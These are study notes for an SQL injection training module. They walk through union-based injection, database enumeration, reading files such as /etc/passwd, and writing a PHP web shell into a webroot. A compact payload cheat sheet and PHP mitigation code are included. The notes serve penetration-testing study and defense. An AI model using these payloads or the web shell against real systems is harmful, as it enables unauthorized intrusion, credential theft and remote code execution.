---
tags: [htb-academy, web-pentest, sql-injection, mysql, revision]
module: SQL Injection Fundamentals
---

# SQL Injection Fundamentals: Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only test SQL injection, read/write files, or drop web shells against systems you are explicitly authorized to test.
> **Assessment note:** No flags or assessment answers are included. Section 7 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 What is SQL Injection

- **What:** A vulnerability where user-supplied input is inserted into a SQL query without proper sanitization, letting an attacker change the query's logic or inject entirely new queries.
- **Why it matters:** Web apps commonly have a three-tier architecture — client (Tier I) → application server (Tier II) → DBMS (Tier III). The app server builds SQL queries using data from incoming HTTP(S) requests; if user input reaches the query unsanitized, that input can alter what the query actually does.
- **How it works, at a high level:**
  1. **Inject:** break out of the expected input boundary, typically with a single quote (`'`) or double quote (`"`).
  2. **Subvert the logic:** make the modified query still valid SQL, either by changing the original query's logic (e.g. with `OR`) or appending/executing a new one (e.g. `UNION`).
  3. **Retrieve the output:** read the result from wherever the app displays query output (or infer it indirectly for blind cases).
- **SQLi vs. NoSQLi:** SQL injection targets relational databases (MySQL, etc.); NoSQL injection targets non-relational databases (e.g. MongoDB) and uses different techniques (covered in a later module, not here).

### 1.2 Impact and Use Cases

- **Data exposure:** dumping sensitive data (credentials, credit card info) — a leading cause of real-world breaches, since leaked credentials get reused elsewhere.
- **Logic subversion:** bypassing authentication (login without valid credentials), accessing restricted features (e.g. admin panels).
- **System compromise:** reading/writing files on the back-end server, potentially planting a web shell and gaining full control of the host.
- **Root cause:** poorly coded applications (no sanitization/validation) and/or poorly configured back-end privileges.

### 1.3 Databases — Background

- **Why DBMS over flat files:** file-based storage becomes slow as data grows; a Database Management System (DBMS) creates, defines, hosts and manages databases efficiently.
- **DBMS features:** Concurrency (safe simultaneous use), Consistency (valid data despite concurrent changes), Security (authentication/permissions), Reliability (backup/rollback), SQL (intuitive query language).
- **Relational databases (RDBMS):** use a schema (template) to structure data into related tables (entities) linked by keys (e.g. a `users` table's `id` linked to a `posts` table's `user_id`). Fast and reliable for well-structured, large datasets. Examples: MySQL, MariaDB, SQL Server, Oracle, PostgreSQL, Microsoft Access.
- **Non-relational (NoSQL) databases:** no tables/rows/columns/schema; scalable and flexible for loosely structured data. Four common models: Key-Value, Document-Based, Wide-Column, Graph. Example: MongoDB. Vulnerable to **NoSQL injection** instead of SQLi (different technique, out of scope here).

### 1.4 Types of SQL Injection

| Category | Subtype | What it means |
|---|---|---|
| **In-band** | Union Based | Output appears directly on the page; you specify the column(s) to read via `UNION` |
| **In-band** | Error Based | You trigger SQL/PHP errors that leak query output into visible error messages |
| **Blind** | Boolean Based | No direct output; you infer data by observing whether the page's behavior changes (true/false condition) |
| **Blind** | Time Based | No direct output; you infer data using response delays (e.g. `SLEEP()`) when a condition is true |
| **Out-of-band** | — | No direct or inferable output on the page; data is exfiltrated via a side channel (e.g. DNS) and retrieved separately |

- **This module's focus:** introducing SQLi through **Union Based** injection specifically.

### 1.5 Subverting Query Logic (OR Injection & Comments)

- **What:** Before injecting whole new queries, you can change how the *original* query evaluates by injecting logical operators or using comments — classic technique: authentication bypass.
- **Why it works — operator precedence:** `AND` is evaluated before `OR`. If a query has `condition1 OR condition2 AND condition3`, and `condition1` (or the OR-side as a whole) is forced true, the entire expression becomes true regardless of the AND clause.
- **How (OR injection):**
  - Classic original query: `SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';`
  - Inject `admin' or '1'='1` as username → `... WHERE username='admin' or '1'='1' AND password='something';`
  - Evaluation: `AND` binds tighter, so `('1'='1' AND password='something')` is false, but `username='admin' OR (that false AND)` is still true if `admin` exists → login succeeds.
  - If the username isn't known to exist, inject the always-true condition into **both** fields (or just start with `' or '1'='1` directly), so the whole `WHERE` clause reduces to true and returns the first row.
- **How (comments):** Use `--` (note: requires a trailing space, e.g. `-- -` to make the space visible, or URL-encoded `--+`) or `#` to comment out the rest of the original query.
  - Inject `admin'--` as username → `SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';` — everything after `--` is ignored, so only the username condition matters.
  - **Parenthesis example:** if the original query groups conditions, e.g. `WHERE (username='admin' AND id > 1) AND password='...'`, a simple `admin'--` breaks the query (unbalanced parenthesis) — you must also close the parenthesis: `admin')--` to get `WHERE (username='admin')`, which succeeds.
- **Why syntax must stay valid:** An odd number of unescaped quotes, or unbalanced parentheses, causes a SQL syntax error instead of a usable injection. You either need an **even number of quotes** or use **comments** to discard the problematic remainder.

### 1.6 Union Clause and Union Injection — Core Idea

- **What:** `UNION` combines the result sets of two or more `SELECT` statements into one output.
- **Requirement:** All `SELECT` statements being combined must return the **same number of columns**, and corresponding columns should be the same/compatible data type — otherwise MySQL throws an error (which is also how you can detect the column count, see §1.7).
- **Why it's powerful for SQLi:** If you can inject a second `SELECT` via `UNION`, you can pull data from **any table/database** the DB user can access — not just the one the original query targets.
- **Matching column count when you don't have the right number of real columns to select:** fill the extra positions with "junk" data — numbers are convenient (and track positions easily); `NULL` is a safer universal filler since it fits any data type.

### 1.7 Detecting the Number of Columns

Two methods, both via a vulnerable parameter:

| Method | How it works | Stop condition |
|---|---|---|
| **`ORDER BY`** | Inject `' order by N-- -` for increasing `N` | Keeps working until `N` exceeds the actual column count → error (`Unknown column 'N' in 'order clause'`). The last successful `N` = column count. |
| **`UNION SELECT`** | Inject `' UNION select 1,2,...,N-- -` for increasing `N` | Keeps erroring (`different number of columns`) until `N` matches the real column count → succeeds. |

- **Trade-off:** `ORDER BY` returns normal results until it fails; `UNION` returns errors until it succeeds. Either works — pick based on what feedback the app gives you.

### 1.8 Locating the Injection (Which Columns Are Displayed)

- **What:** A query can return more columns than the web page actually displays. You need to inject your payload into a column whose output is actually rendered.
- **How:** After confirming the column count, `UNION SELECT` numbers (e.g. `1,2,3,4`) and observe which numbers appear on the page. Columns that **don't** appear (e.g. a hidden ID column) are not useful injection points.
- **Verification trick:** Replace a displayed numeric placeholder with `@@version` (or similar) to confirm you're pulling **real database data**, not just numbers.

### 1.9 Database Fingerprinting

- **Why:** Different DBMS products use different syntax/metadata tables, so you need to know what you're dealing with before enumerating further.
- **Weak signal:** Web server software can hint at the OS/DBMS (Apache/Nginx → often Linux/MySQL; IIS → often MSSQL) — not reliable on its own.
- **Direct tests:**

| Payload | When to use | Expected (MySQL/MariaDB) | Wrong DBMS behavior |
|---|---|---|---|
| `SELECT @@version` | Full query output available | Version string (e.g. `10.3.22-MariaDB-1ubuntu1`) | MSSQL returns its own version; errors on other DBMS |
| `SELECT POW(1,1)` | Only numeric output available | `1` | Errors on other DBMS |
| `SELECT SLEEP(5)` | Blind / no visible output | Delays response ~5s, returns `0` | No delay on other DBMS |

### 1.10 Database Enumeration via `INFORMATION_SCHEMA`

- **What:** `INFORMATION_SCHEMA` is a built-in metadata database present in MySQL/MariaDB describing every database, table and column on the server.
- **Why it's central to SQLi:** It lets you enumerate *what exists* before you know table/column names in advance — essential since you usually don't have source-code access.
- **Cross-database reference:** Use the dot operator (`database.table`) to query a table outside the current database.
- **Enumeration path (in order):**
  1. **`SCHEMATA`** (column `SCHEMA_NAME`) → list all databases. (Default/system DBs to ignore: `information_schema`, `mysql`, `performance_schema`, sometimes `sys`.)
  2. **`SELECT database()`** → find which database the current page/query is actually using.
  3. **`TABLES`** (columns `TABLE_NAME`, `TABLE_SCHEMA`) → list tables in a target database, filtered with `WHERE table_schema='dbname'`.
  4. **`COLUMNS`** (columns `COLUMN_NAME`, `TABLE_NAME`, `TABLE_SCHEMA`) → list columns in a target table, filtered with `WHERE table_name='tablename'`.
  5. **Data dump:** `SELECT col1, col2 FROM db.table` via `UNION`, once you know the schema/table/column names.

### 1.11 Reading Files via SQLi

- **Requirement:** The DB user needs the **FILE privilege**, and (for MySQL specifically) the `secure_file_priv` variable must not block the target path.
- **Check your DB user:** `SELECT USER()`, `SELECT CURRENT_USER()`, or `SELECT user FROM mysql.user`.
- **Check privileges:**
  - Superuser check: `SELECT super_priv FROM mysql.user` (filter with `WHERE user="..."`).
  - Full privilege list: `SELECT grantee, privilege_type FROM information_schema.user_privileges` (filter with `WHERE grantee="'user'@'host'"`).
  - Look specifically for the **FILE** privilege.
- **Reading a file:** `LOAD_FILE('/path/to/file')` — requires the OS user running MySQL to have OS-level read access to that file too.
- **Practical use:** read `/etc/passwd` to confirm the capability; read the web app's own PHP source (e.g. `/var/www/html/search.php`) to find DB credentials or other logic/vulnerabilities. Since the raw PHP may render as HTML in-browser, view it via `Ctrl+U` (page source) to see the actual code.

### 1.12 Writing Files via SQLi

- **Three requirements (all must be true):**
  1. DB user has the **FILE** privilege.
  2. MySQL's **`secure_file_priv`** global variable is not restrictively set (empty = anywhere; a path = only that folder; `NULL` = nowhere).
  3. The OS-level account running MySQL has **write access** to the target filesystem location.
- **Checking `secure_file_priv` via injection:** query `information_schema.global_variables`, filtering `WHERE variable_name="secure_file_priv"` (since `SHOW VARIABLES` itself can't be used inside a `UNION SELECT`).
- **Writing:** `SELECT ... INTO OUTFILE '/path/to/file'` — can write literal strings or query results.
- **Finding the webroot (to write somewhere browsable):** read server config via `LOAD_FILE()` (Apache: `/etc/apache2/apache2.conf`; Nginx: `/etc/nginx/nginx.conf`; IIS: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`), fuzz common webroot paths, or infer from server error messages.
- **Escalation to code execution:** write a minimal PHP web shell (e.g. `<?php system($_REQUEST[0]); ?>`) into the webroot via `INTO OUTFILE`, then browse to it and pass commands as a parameter — confirms RCE (often as a low-privileged web server user, e.g. `www-data`).

### 1.13 Mitigating SQL Injection

| Defense | What it does | Example mechanism |
|---|---|---|
| **Input sanitization** | Escapes special characters (`'`, `"`) so they lose their syntactic meaning | `mysqli_real_escape_string()` (MySQL), `pg_escape_string()` (PostgreSQL) |
| **Input validation** | Rejects input that doesn't match an expected pattern/format | Regex (e.g. `preg_match()`) restricting a field to only letters/spaces |
| **Least-privilege DB users** | Limits what a compromised/abused DB session can actually do | `CREATE USER` + `GRANT SELECT ON db.table TO 'user'@'host'` — never run the web app as a superuser/admin |
| **Web Application Firewall (WAF)** | Detects and blocks malicious-looking requests before they reach the app | ModSecurity (open-source), Cloudflare (premium); often has default rules (e.g. blocking requests containing `INFORMATION_SCHEMA`) |
| **Parameterized queries (prepared statements)** | Input is bound as data, never concatenated into the query string, so it can't change query structure | `mysqli_prepare()` + `mysqli_stmt_bind_param()` with `?` placeholders |

- **Key point from source:** this list is **not exhaustive** — exploitation may still be possible depending on application logic, even with defenses in place. Examples are PHP-specific, but the underlying logic applies across languages/frameworks.

---

## 2. Important Terminology

| Term | Short definition |
|---|---|
| SQL Injection (SQLi) | Injecting attacker-controlled input into a SQL query to alter its behavior |
| NoSQL Injection | The equivalent attack class against non-relational databases (different technique) |
| DBMS | Database Management System — software that creates/hosts/manages databases |
| RDBMS | Relational DBMS; uses schemas, tables, keys (e.g. MySQL, MariaDB) |
| Schema | The defined relationship/structure between tables in a relational database |
| Primary key | Column(s) uniquely identifying each row in a table |
| In-band SQLi | Injection where output is visible directly on the page (Union/Error based) |
| Blind SQLi | Injection where output isn't directly visible; inferred via True/False or timing (Boolean/Time based) |
| Out-of-band SQLi | Injection where output is exfiltrated via a separate channel (e.g. DNS) |
| Sanitization | Stripping/escaping special characters from input so they can't break query syntax |
| Validation | Checking input conforms to an expected format before use |
| `UNION` | SQL clause combining the results of multiple `SELECT` statements (same column count/types required) |
| Junk data | Placeholder values (numbers/`NULL`) used to pad out unused `UNION` columns |
| `INFORMATION_SCHEMA` | Built-in MySQL/MariaDB metadata database describing all databases/tables/columns |
| `SCHEMATA` | `INFORMATION_SCHEMA` table listing all database names |
| `TABLES` | `INFORMATION_SCHEMA` table listing all tables (with their parent database) |
| `COLUMNS` | `INFORMATION_SCHEMA` table listing all columns (with their parent table/database) |
| `LOAD_FILE()` | MySQL/MariaDB function reading a file's contents from the OS filesystem |
| `SELECT ... INTO OUTFILE` | MySQL/MariaDB syntax writing query output to a file on the OS filesystem |
| `secure_file_priv` | MySQL/MariaDB global variable restricting where `LOAD_FILE`/`INTO OUTFILE` can read/write |
| FILE privilege | MySQL/MariaDB user privilege required to read/write files via SQL |
| Web shell | A script (e.g. PHP) placed on a server that lets an attacker execute arbitrary commands via HTTP |
| Parameterized query / prepared statement | A query with placeholders bound to data separately from the SQL text, preventing injection |
| WAF | Web Application Firewall; filters malicious-looking HTTP requests |
| `@@version` | MySQL/MariaDB system variable returning the server version string |

---

## 3. Commands and Reference

### 3.1 MySQL/MariaDB CLI Basics

| Command | Purpose |
|---|---|
| `mysql -u root -p` | Log in, prompting for password (preferred — avoids password in shell history) |
| `mysql -u root -p<password>` | Log in with inline password (avoid — risks logging/history exposure; no space after `-p`) |
| `mysql -u root -h <host> -P <port> -p` | Log in to a remote host/port (`-h` host, uppercase `-P` port — default port 3306) |
| `SHOW DATABASES;` | List databases |
| `USE <db>;` | Switch active database |
| `SHOW TABLES;` | List tables in the current database |
| `DESCRIBE <table>;` | Show a table's columns and types |
| `SHOW GRANTS;` | Show the current user's privileges |

- **Note:** SQL statements are case-insensitive, but database/table/column names are case-sensitive. Convention: write keywords in uppercase for clarity.
- **Note:** MySQL queries must be terminated with `;`.

### 3.2 Creating Databases and Tables

```sql
CREATE DATABASE users;

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```
- **Column properties used here:**
  - `AUTO_INCREMENT`: auto-increments the value on each insert.
  - `NOT NULL`: field is required.
  - `UNIQUE`: no duplicate values allowed.
  - `DEFAULT NOW()`: defaults to the current date/time if omitted.
  - `PRIMARY KEY (id)`: uniquely identifies each row.

### 3.3 Core SQL Statements (DML/DDL)

**INSERT**
```sql
INSERT INTO table_name VALUES (col1_value, col2_value, ...);
INSERT INTO table_name(col2, col3) VALUES (col2_value, col3_value);
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```
- Omitting columns with defaults (like an auto-increment `id`) is fine; omitting a `NOT NULL` column without a default causes an error. Multiple rows can be inserted in one statement, comma-separated.

**SELECT**
```sql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```
- `*` = all columns.

**DROP**
```sql
DROP TABLE logins;
```
- Permanently deletes a table with **no confirmation** — use with caution.

**ALTER**
```sql
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
ALTER TABLE logins MODIFY newerColumn DATE;
ALTER TABLE logins DROP newerColumn;
```
- Add, rename, change type of, or drop a column.

**UPDATE**
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE <condition>;
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
- `WHERE` is required to target specific rows; omitting it updates every row.

### 3.4 Controlling Query Output

**Sorting**
```sql
SELECT * FROM logins ORDER BY password;          -- ascending (default)
SELECT * FROM logins ORDER BY password DESC;      -- descending
SELECT * FROM logins ORDER BY password DESC, id ASC;  -- multi-column sort
```

**Limiting**
```sql
SELECT * FROM logins LIMIT 2;        -- first 2 rows
SELECT * FROM logins LIMIT 1, 2;     -- offset 1 (0-indexed), then 2 rows
```

**Filtering — `WHERE`**
```sql
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';
```
- Strings/dates need quotes (`'` or `"`); numbers don't.

**Pattern matching — `LIKE`**
```sql
SELECT * FROM logins WHERE username LIKE 'admin%';   -- % = zero or more chars
SELECT * FROM logins WHERE username LIKE '___';       -- _ = exactly one char (3 underscores = 3-char match)
```

### 3.5 Logical and Comparison Operators

| Word form | Symbol form | Behavior |
|---|---|---|
| `AND` | `&&` | True only if both conditions are true |
| `OR` | `\|\|` | True if at least one condition is true |
| `NOT` | `!` | Inverts a boolean |
| — | `!=` | Not equal |

- **MySQL truthiness:** any non-zero value is "true" (usually shown as `1`); `0` is "false".
- **Operator precedence (highest to lowest, per MariaDB docs):**
  1. `/`, `*`, `%` (division, multiplication, modulus)
  2. `+`, `-` (addition, subtraction)
  3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
  4. `NOT` (`!`)
  5. `AND` (`&&`)
  6. `OR` (`||`)
- **Why this matters for injection:** `AND` binds tighter than `OR`, which is exactly what makes `username='admin' OR '1'='1' AND password='x'` evaluate to true overall — see §1.5.

### 3.6 Comments in SQL

| Syntax | Notes |
|---|---|
| `-- ` | Line comment; **requires a trailing space** after the two dashes to be valid. Often written as `-- -` to make the space visible in documentation, or URL-encoded as `--+` |
| `#` | Line comment. In a browser URL, `#` is normally treated as a fragment/anchor and won't be sent — use the URL-encoded `%23` instead |
| `/* ... */` | Inline comment; not typically used in basic SQL injection scenarios per the source |

### 3.7 SQLi Discovery Payloads

| Payload | URL Encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

- **Purpose:** Try these (one at a time) in an input field to see if they cause SQL errors or unexpected behavior changes — a sign the field may be vulnerable.
- **When to URL-encode:** When placing the payload directly in a URL (GET parameter).

### 3.8 Authentication Bypass Payloads (examples from source)

```sql
admin' or '1'='1
```
```sql
' or '1'='1
```
```sql
admin'--
```
```sql
admin')--
```
- **Context:** First two abuse operator precedence with `OR`; last two use comments to discard the rest of the original query (second one also closes a parenthesis). See §1.5 for the full walkthrough. A broader payload list exists in PayloadsAllTheThings — different payloads suit different query structures.

### 3.9 Union Injection — Step by Step Payload Pattern

**1. Confirm injectability**
```
cn'
```

**2. Find column count — `ORDER BY` method**
```
' order by 1-- -
' order by 2-- -
...continue until an error appears...
```

**2 alt. Find column count — `UNION` method**
```
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
...continue until it succeeds...
```

**3. Confirm real data output (vs. just numbers)**
```sql
cn' UNION select 1,@@version,3,4-- -
```

**4. Enumerate databases**
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
```

**5. Enumerate tables in a target database**
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

**6. Enumerate columns in a target table**
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

**7. Dump the data**
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
- **Note the dot operator** (`dev.credentials`): needed because the app's current database (`ilfreight` in the example) differs from where the target table lives.

### 3.10 Privilege and File-Access Enumeration Payloads

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### 3.11 File Read/Write Payloads

**Read a file**
```sql
SELECT LOAD_FILE('/etc/passwd');
```
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
- **Note:** If the loaded content is HTML/PHP source, it may render in the browser — view the raw text via `Ctrl+U` (page source) rather than the rendered page.

**Write a file**
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
- **Tip for cleaner output:** use `""` instead of numbers for the junk columns, so the written file doesn't contain stray digits mixed with your actual content.

**Write a PHP web shell**
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
- **Use it:** `http://SERVER_IP:PORT/shell.php?0=id` — the `0` GET parameter is passed to `system()`.
- **Tip for advanced file writes (binary data):** use `FROM_BASE64("base64_data")` to encode/decode content safely through the query.

### 3.12 Mitigation Code Reference (PHP)

**Vulnerable (string concatenation)**
```php
$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
```

**Sanitization**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
```

**Validation (regex-based)**
```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];
if(!preg_match($pattern, $code)) {
  die("Invalid input! Please try again.");
}
```

**Least-privilege DB user**
```sql
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

**Parameterized query**
```php
$query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
```
- `'ss'` = both bound parameters are strings (mysqli type-specifier string).

### 3.13 Burp Suite: Intercepting HTTPS (for the Skills Assessment)

**Option 1 — Burp's built-in browser:** Proxy tab → **Open browser**. Intercepts HTTPS automatically; comes with extensions like DOM Invader pre-installed.

**Option 2 — Install Burp's CA in your own browser (example: Firefox):**
1. Configure the browser to proxy through `http://localhost:8080`.
2. Visit `http://burpsuite` → click **CA Certificate** → save `cacert.der`.
3. Firefox Settings → search "Certificates" → **View Certificates...** → **Authorities** tab → **Import** → select `cacert.der` → check both trust boxes → OK.
4. Use the **FoxyProxy** extension to toggle the proxy on/off quickly: Options → Add → IP `127.0.0.1`, Port `8080`, name it (e.g. "Burp") → Save → select it from the toolbar icon.
- **Note:** On PwnBox, Burp's certificate is pre-installed — just select the Burp profile in FoxyProxy.

---

## 4. Practical Workflow

1. **Confirm authorization and scope.**
2. **Identify candidate input points:** form fields, URL/GET parameters, POST data — anywhere user input might reach a SQL query.
3. **Discovery:** inject `'`, `"`, `#`, `;`, `)` (or their URL-encoded forms) one at a time and watch for SQL errors or behavior changes.
4. **Fingerprint the DBMS:** `@@version`, `POW(1,1)`, or `SLEEP(5)` depending on what feedback you get (full output, numeric-only, or blind).
5. **Classify the injection type:** In-band (Union/Error) if output is visible; Blind (Boolean/Time) if not; Out-of-band as a last resort. (This module focuses on Union-based.)
6. **For Union-based:**
   a. Find the column count (`ORDER BY` or `UNION SELECT` incrementing).
   b. Identify which columns render on the page (inject distinct numbers, see which appear).
   c. Confirm real data flows through (swap a number for `@@version`).
   d. Enumerate: `SCHEMATA` → current `database()` → `TABLES` (filtered by schema) → `COLUMNS` (filtered by table) → final data dump with the dot operator across databases as needed.
7. **Check privileges before attempting file access:** current user (`user()`), superuser flag (`super_priv`), and full privilege list (`information_schema.user_privileges`) — look specifically for **FILE**.
8. **If reading files:** `LOAD_FILE()` known paths (`/etc/passwd` to confirm, then app source files to find credentials/logic).
9. **If writing files:** confirm `secure_file_priv` isn't blocking you, confirm OS-level write access to the target directory, locate the webroot, write a test file, then (if appropriate/authorized) a web shell for command execution.
10. **Attempt auth bypass separately where relevant:** `OR` operator abuse and comment-based truncation on login forms.
11. **Document findings and recommend mitigations:** sanitization, validation, least-privilege DB accounts, WAF, and — most robustly — parameterized queries.

### Common Mistakes
- Forgetting the **space after `--`** when commenting (breaks the comment syntax).
- Using `#` directly in a browser URL instead of its encoded form `%23` (browsers treat `#` as a fragment and strip it before sending).
- Mismatching the number of `UNION SELECT` columns with the original query.
- Placing the injection in a column that isn't actually rendered on the page.
- Forgetting the dot operator (`db.table`) when the target table lives in a different database than the one currently in use.
- Assuming file read/write will work without first checking FILE privilege and (for write) `secure_file_priv`.
- Treating `DROP`/file-write operations casually — they're destructive/irreversible and have no confirmation prompt.
- Relying only on front-end validation as a defense — it doesn't stop a crafted request sent directly to the back end.

### Troubleshooting
- **Syntax error on your injection:** check your quote count is even, or that you've properly commented out the remainder of the query; check parentheses are balanced.
- **`UNION` gives a "different number of columns" error:** your column count guess is wrong — keep incrementing/testing.
- **You get results but nothing useful appears:** your payload may be in a column that isn't displayed — try a different position.
- **`LOAD_FILE()` returns NULL:** the OS user running MySQL likely lacks read permission on that path, or `secure_file_priv` restricts it.
- **`INTO OUTFILE` seems to silently fail (no file at target path):** check `secure_file_priv`, OS write permissions to that directory, and that you guessed the correct webroot/path.

---

## 5. SQL Injection Prevention Reference

| Measure | What it does | Example |
|---|---|---|
| **Input sanitization** | Escape special characters so injected syntax is inert | `mysqli_real_escape_string()`, `pg_escape_string()` |
| **Input validation** | Reject input that doesn't match an expected format | `preg_match()` with a strict regex |
| **Least-privilege DB users** | Limit blast radius if the app's DB session is abused | Dedicated app user with only the `SELECT`/etc. it actually needs, never a superuser |
| **WAF** | Blocks requests matching known attack signatures | ModSecurity, Cloudflare |
| **Parameterized queries** | Input is bound as data, never concatenated into query text | `mysqli_prepare()` + `mysqli_stmt_bind_param()` |

- **Caveat from source:** none of these are individually exhaustive protection — application logic flaws can still create exploitable paths even with some defenses in place. Parameterized queries are the most structurally robust of the listed options, since they remove the possibility of input altering query syntax at all.

---

## 6. Quick Revision Sheet

### 6.1 Top 10 Things to Remember
1. SQLi = user input changes a SQL query's intended logic/structure; this module covers MySQL/MariaDB specifically.
2. Injection needs: break out of the input boundary (often `'`/`"`), keep the resulting query syntactically valid, then read the output.
3. Operator precedence (`AND` before `OR`) is what makes `' OR '1'='1` style payloads work for auth bypass.
4. `--` (with a trailing space) and `#` comment out the rest of a query — essential for handling unbalanced quotes/parentheses.
5. `UNION` needs matching column counts across both `SELECT`s; find the count via `ORDER BY` or incrementing `UNION SELECT`.
6. Not every selected column is displayed on the page — identify which ones render before placing your real payload.
7. `INFORMATION_SCHEMA` (`SCHEMATA` → `TABLES` → `COLUMNS`) is how you enumerate the DB structure blind to source code.
8. File read (`LOAD_FILE`) and write (`INTO OUTFILE`) require the FILE privilege, and write additionally requires a permissive `secure_file_priv` and OS write access — write access can lead to a web shell and RCE.
9. Fingerprint the DBMS first (`@@version`, `POW(1,1)`, `SLEEP(5)`) since techniques are DBMS-specific.
10. Best mitigations, in order of robustness: parameterized queries > strict input validation > sanitization > least-privilege DB accounts > WAF (defense in depth, not any single silver bullet).

### 6.2 Compact Command/Payload Reference

| Task | Payload |
|---|---|
| Discovery | `'`, `"`, `#`, `;`, `)` (or URL-encoded) |
| Auth bypass (OR) | `admin' or '1'='1` |
| Auth bypass (comment) | `admin'--` or `admin')--` (if parentheses present) |
| Column count (ORDER BY) | `' order by N-- -` |
| Column count (UNION) | `' UNION select 1,2,...,N-- -` |
| Confirm real data | `' UNION select 1,@@version,3,4-- -` |
| List databases | `UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` |
| Current database | `UNION select 1,database(),2,3-- -` |
| List tables | `UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='X'-- -` |
| List columns | `UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='X'-- -` |
| Dump data | `UNION select 1,col1,col2,4 from db.table-- -` |
| Current DB user | `UNION SELECT 1, user(), 3, 4-- -` |
| Check FILE privilege | `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'user'@'host'"-- -` |
| Check secure_file_priv | `UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` |
| Read a file | `UNION SELECT 1, LOAD_FILE("/path"), 3, 4-- -` |
| Write a file | `UNION select 1,'content',3,4 into outfile '/path'-- -` |
| Write a web shell | `UNION select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` |
| mysql CLI login | `mysql -u root -p` |

### 6.3 Common Mistakes to Avoid
- Missing space after `--`.
- Using raw `#` in a browser URL instead of `%23`.
- Wrong `UNION` column count.
- Injecting into a non-displayed column.
- Forgetting the `db.table` dot operator across databases.
- Skipping privilege checks before attempting file read/write.
- Treating front-end-only validation as sufficient defense.

### 6.4 Revision Questions

1. **Why does `username='admin' OR '1'='1' AND password='x'` evaluate to true overall?**
   `AND` has higher precedence than `OR`, so `('1'='1' AND password='x')` is evaluated first (likely false), but the `OR` with `username='admin'` being true makes the whole expression true regardless.
2. **What two methods can determine the number of columns for a Union injection, and how do their failure/success patterns differ?**
   `ORDER BY N` (succeeds until N is too high, then errors) and `UNION SELECT 1,2,...,N` (errors until N matches, then succeeds).
3. **Why might a successful `UNION SELECT` still not show your injected data on the page?**
   Not every selected column is rendered by the application; your payload may be in a column position that isn't displayed.
4. **What three `INFORMATION_SCHEMA` tables are used to enumerate a database's structure, and in what order?**
   `SCHEMATA` (databases) → `TABLES` (tables per database) → `COLUMNS` (columns per table).
5. **What privilege is required to read or write files via MySQL, and what else must be true to write files specifically?**
   The FILE privilege; additionally `secure_file_priv` must not block the target path, and the OS user running MySQL needs write access there.
6. **How do you confirm your current database user and their privileges via injection?**
   `SELECT USER()` / `SELECT CURRENT_USER()` for the user; `super_priv` in `mysql.user` or `information_schema.user_privileges` for privileges.
7. **What's the difference between `LOAD_FILE()` and `SELECT ... INTO OUTFILE`?**
   `LOAD_FILE()` reads a file's contents into a query result; `INTO OUTFILE` writes a query's result out to a file on disk.
8. **Why is a parameterized query considered a stronger defense than input sanitization alone?**
